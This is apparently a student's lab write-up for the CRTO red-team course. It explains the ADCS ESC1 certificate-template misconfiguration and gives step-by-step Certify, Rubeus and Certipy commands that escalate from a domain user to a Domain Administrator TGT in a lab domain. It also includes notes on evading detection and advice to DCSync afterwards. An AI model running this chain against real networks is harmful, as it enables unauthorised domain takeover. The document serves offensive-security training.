# CRTO — ADCS: ESC1 Lab

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Lab:** ADCS ESC1
**Objective:** Identify and exploit ESC1 misconfiguration in Active Directory Certificate Services to obtain a TGT for the domain Administrator

---

## The Full Chain

```
Certify enum-templates → identify ESC1 vulnerable template
    ↓
Certify request → request cert with Administrator UPN in SAN
    ↓
ADCS issues certificate authenticating as Administrator (no validation of UPN ownership)
    ↓
Rubeus asktgt → use certificate for PKINIT auth → KDC returns TGT for Administrator
    ↓
inject TGT → full DA access
```

---

## What Is ESC1?

ESC1 is a certificate template misconfiguration where **all of the following conditions are true:**

| Condition | Why It Matters |
|---|---|
| Template allows **client authentication** | Certificate can be used for Kerberos PKINIT auth |
| **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT** is set | Requester can specify any Subject Alternative Name (SAN) in the CSR |
| Low-privileged users have **enroll rights** | Any domain user can request a certificate from this template |
| **Manager approval not required** | Certificate is issued immediately without review |

> The combination of "any user can enroll" + "requester controls the SAN" + "no approval needed" means any domain user can request a certificate that authenticates as **any other user in the domain** — including Domain Admins.

---

## Step 1 — Enumerate Vulnerable Templates

```bash
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates \
  --filter-enabled \
  --filter-vulnerable \
  --hide-admins \
  --quiet
```

**Flag breakdown:**

| Flag | Purpose |
|---|---|
| `enum-templates` | Enumerate all certificate templates on the CA |
| `--filter-enabled` | Only show templates that are currently enabled |
| `--filter-vulnerable` | Only show templates with known ESC misconfigs |
| `--hide-admins` | Suppress templates only enrollable by admins (not exploitable by low-priv users) |
| `--quiet` | Suppress banner output |

**Expected output:** Template named `ESC1` with:
```
msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT
pKIExtendedKeyUsage          : Client Authentication
Enrollment Rights            : Domain Users (or similar low-priv group)
```

---

## Step 2 — Request Certificate with Administrator SAN

```bash
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request \
  --ca "lon-cs-1.contoso.com\CONTOSO Root CA" \
  --template ESC1 \
  --upn Administrator \
  --quiet
```

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| `--ca` | `lon-cs-1.contoso.com\CONTOSO Root CA` | Target CA — format: `<CA host>\<CA name>` |
| `--template` | `ESC1` | Vulnerable template to request from |
| `--upn` | `Administrator` | UPN to embed in the SAN — what the certificate authenticates as |
| `--quiet` | — | Suppress banner |

**What happens:**
```
Certify sends a CSR to the CA with:
    Subject Alternative Name: UPN = Administrator@CONTOSO.COM

CA checks:
    YES  Requester has enroll rights on ESC1
    YES  Template allows ENROLLEE_SUPPLIES_SUBJECT
    NO   Does NOT verify that requester owns Administrator's UPN

CA issues certificate authenticating as Administrator
```

---

## Step 3 — Request TGT via PKINIT

```bash
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt \
  /user:Administrator \
  /domain:CONTOSO.COM \
  /certificate:[base64 cert] \
  /enctype:aes256 \
  /nowrap
```

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| `asktgt` | — | Request a TGT from the KDC |
| `/user` | `Administrator` | Must match the UPN in the certificate SAN |
| `/domain` | `CONTOSO.COM` | Target domain |
| `/certificate` | Base64 PFX | Certificate from Certify (includes private key) |
| `/enctype` | `aes256` | Request AES256 TGT — avoid RC4 |
| `/nowrap` | — | Single-line base64 output |

**PKINIT protocol flow:**
```
Rubeus sends AS-REQ to KDC with PKINIT pre-authentication (certificate)
    ↓
KDC validates certificate against trusted CA
KDC reads SAN UPN → Administrator@CONTOSO.COM
    ↓
KDC issues TGT for Administrator
```

> **PKINIT** is the Kerberos extension allowing certificates in place of passwords for AS-REQ auth. Entirely legitimate — ESC1 abuses the fact that the CA issues a cert with a UPN the requester doesn't own.

---

## Step 4 — Inject and Use TGT

```bash
make_token CONTOSO\Administrator FakePass
execute-assembly Rubeus.exe ptt /ticket:[base64 TGT]
run klist
ls \\lon-dc-1\c$
```

---

## ESC Misconfiguration Reference

| ESC | Misconfiguration | Requires |
|---|---|---|
| **ESC1** | ENROLLEE_SUPPLIES_SUBJECT + low-priv enroll + client auth | Any domain user |
| ESC2 | Any purpose EKU + low-priv enroll | Any domain user |
| ESC3 | Certificate Request Agent EKU abuse | Any domain user |
| ESC4 | Write access to template — modify to ESC1 | Template write rights |
| ESC8 | NTLM relay to HTTP AD CS enrollment endpoint | MITM position |
| ESC13 | OID group link abuse | OID group membership |

> ESC1 is the most direct — no template modification, no relay, no intermediate steps. Three commands from any domain user to DA.

---

## Certify vs Certipy

| Tool | Language | Best For |
|---|---|---|
| Certify | C# / execute-assembly | In-Beacon execution |
| Certipy | Python | Attacker-side Linux tooling, better output parsing |

**Certipy equivalent:**
```bash
# Enumerate
certipy find -u pchilds@contoso.com -p 'Passw0rd!' -dc-ip 10.10.120.1 -vulnerable -stdout

# Request cert
certipy req -u pchilds@contoso.com -p 'Passw0rd!' -ca 'CONTOSO Root CA' \
  -target lon-cs-1.contoso.com -template ESC1 -upn Administrator@contoso.com

# Authenticate
certipy auth -pfx administrator.pfx -domain contoso.com -dc-ip 10.10.120.1
```

---

## OPSEC Considerations

| Risk | Detail |
|---|---|
| Certificate request logging | CA logs event 4886 (cert requested) + 4887 (cert issued). UPN mismatch may trigger alerts. |
| PKINIT AS-REQ | Logged as 4768 with pre-auth type 16 (PKINIT) vs 18 (password). Anomalous PKINIT from non-standard users may be flagged. |
| Template enumeration | Certify LDAP queries identical to normal AD reads — very low detection risk |

---

## MITRE ATT&CK Mapping

| TTP | Technique | Detail |
|---|---|---|
| T1649 | Steal or Forge Authentication Certificates | Request cert with arbitrary SAN via ESC1 |
| T1558.001 | Steal or Forge Kerberos Tickets | PKINIT → obtain DA TGT |
| T1078.002 | Valid Accounts: Domain Accounts | Authenticate as Administrator |

---

## Key Takeaways

- ESC1 requires four conditions simultaneously — ENROLLEE_SUPPLIES_SUBJECT + client auth EKU + low-priv enroll + no manager approval
- The CA does **not validate** that the requester owns the UPN in the SAN — this is the core flaw
- Always use `/enctype:aes256` — prefer AES256 over RC4 for the TGT request
- CA format is `<FQDN of CA host>\<CA name>` — getting this wrong causes silent failure
- ESC1 is three commands from any domain user to Administrator TGT
- After exploiting ESC1 → DCSync immediately while DA access is live
